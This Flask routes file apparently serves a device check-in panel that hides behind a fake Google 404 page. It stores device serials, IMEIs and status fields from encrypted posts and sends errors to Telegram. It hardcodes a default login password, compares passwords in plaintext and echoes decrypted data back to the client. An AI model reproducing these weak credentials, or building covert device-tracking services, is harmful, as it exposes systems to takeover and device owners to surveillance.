from flask import request, jsonify, render_template, current_app, session, redirect, url_for
from utils import decrypt_ciphertext_b64, load_private_key_from_b64
from extensions import db
from models.device_info import DeviceInfo
from services.telegram_bot import log_error_to_telegram
import json
import datetime
import os

SERVER_PRIVATE_KEY_B64 = os.environ.get("SERVER_PRIVATE_KEY_B64")
WEB_PASSWORD = os.environ.get("WEB_PASSWORD", "Son1234@") # Default password if not set
SERVER_PRIVATE_KEY_OBJ = None

try:
    if SERVER_PRIVATE_KEY_B64:
        SERVER_PRIVATE_KEY_OBJ = load_private_key_from_b64(SERVER_PRIVATE_KEY_B64)
    else:
        print("WARNING: SERVER_PRIVATE_KEY_B64 is missing.")
except Exception as e:
    print(f"CRITICAL: Failed to load private key at startup: {e}")

def index():
    return render_template('google_404.html'), 200

def login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == WEB_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('base.devices'))
        else:
            return render_template('login.html', error="Invalid password")
    return render_template('login.html')

def logout():
    session.pop('logged_in', None)
    return redirect(url_for('base.login'))

def devices():
    if not session.get('logged_in'):
        return redirect(url_for('base.login'))
    
    all_devices = DeviceInfo.query.order_by(DeviceInfo.updated_at.desc()).all()
    return render_template('devices.html', devices=all_devices)

def healthy():
    # Handle GET request
    if request.method == 'GET':
        sn_query = request.args.get('sn')
        if sn_query:
            device = DeviceInfo.query.get(sn_query)
            if device:
                 return jsonify({"status": device.status, "sn": device.sn}), 200
            else:
                 return jsonify({"status": "unknown", "error": "Device not found"}), 404
        return jsonify({"message": "Service is running"}), 200

    # Handle POST request
    # Try to get data from JSON 'data' field, or 'ciphertext_b64', or just raw body
    data = None
    if request.is_json:
        data = request.json.get('data') or request.json.get('ciphertext_b64')
    
    if not data:
        # Fallback to form data
        data = request.form.get('data') or request.form.get('ciphertext_b64')
    
    if not data:
        # Fallback to raw data if it looks like a b64 string
        raw = request.data.decode('utf-8').strip()
        if raw:
            data = raw
    if not data:
        return jsonify({"error": "No data provided"}), 400

    if not SERVER_PRIVATE_KEY_OBJ:
        log_error_to_telegram(current_app._get_current_object(), "Server configuration error: Missing Private Key or Invalid Key")
        return jsonify({"status": 70}), 500

    try:
        decrypted_text = decrypt_ciphertext_b64(data, SERVER_PRIVATE_KEY_OBJ)
        
        sn = None
        imei = None
        st_data = {}
        
        try:
            json_data = json.loads(decrypted_text)
            if isinstance(json_data, dict):
                sn = json_data.get('SN') or json_data.get('sn')
                imei = json_data.get('Imei') or json_data.get('imei') or json_data.get('IMEI')
                
                # Extract keys starting with ST
                for k, v in json_data.items():
                    if k.upper().startswith('ST'):
                        st_data[k] = v
        except json.JSONDecodeError:
            pass

        if not sn:
            # Fallback to query param 'serial'
            sn = request.args.get('serial')

        if sn:
            # Update Database
            device = DeviceInfo.query.get(sn)
            if not device:
                device = DeviceInfo(sn=sn)
                db.session.add(device)
            
            if imei:
                device.imei = imei
            
            if st_data:
                 # Merge or overwrite ST data
                 device.st_data = json.dumps(st_data)
            
            device.updated_at = datetime.datetime.utcnow()
            db.session.commit()
            
            # Return status and decrypted text
            return jsonify({
                "status": device.status,
                "data_debug_will_del": json.loads(decrypted_text)
            }), 200

        return jsonify({"data": json.loads(decrypted_text), "status": "unknown"}), 200

    except ValueError as ve:
        log_error_to_telegram(current_app._get_current_object(), f"Decryption/Validation Error: {str(ve)}")
        return jsonify({"status": 77}), 200
    except Exception as e: # Catch generic DB errors here too if needed, though specific is better
        db.session.rollback()
        log_error_to_telegram(current_app._get_current_object(), f"Internal Processing Error: {str(e)}")
        return jsonify({"status": 77}), 200
